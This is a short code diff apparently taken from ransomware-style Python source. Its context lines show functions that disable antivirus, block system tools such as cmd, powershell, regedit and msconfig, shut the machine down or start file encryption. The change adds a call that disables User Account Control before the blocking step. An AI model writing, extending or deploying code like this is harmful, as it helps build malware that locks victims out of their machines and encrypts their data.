@@ -622,6 +622,7 @@ def disable_AV():
 
 
 def disable_all():
+    disable_uac()
     # fmt: off
     black_list = [
         "cmd", "powershell", "regedit", "msconfig", 
@@ -795,3 +796,4 @@ if __name__ == "__main__":
         shutdown()
     else:
         start_encryption()
+
